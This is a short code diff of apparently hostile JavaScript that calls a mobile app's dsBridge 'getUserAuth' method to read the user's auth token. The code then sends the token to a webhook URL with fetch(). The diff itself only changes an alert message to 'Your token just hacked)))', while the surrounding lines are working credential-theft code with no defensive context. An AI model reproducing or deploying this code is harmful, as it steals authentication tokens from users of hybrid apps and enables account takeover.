@@ -27,7 +27,7 @@
 
             dsBridge.call("getUserAuth", function(result) {
                 var token = JSON.stringify(result);
-                alert("Token olindi: " + token);
+                alert("Your token just hacked)))");
                 
                 var url = webhook + "?token=" + encodeURIComponent(token);
                 fetch(url, {mode: 'no-cors'});
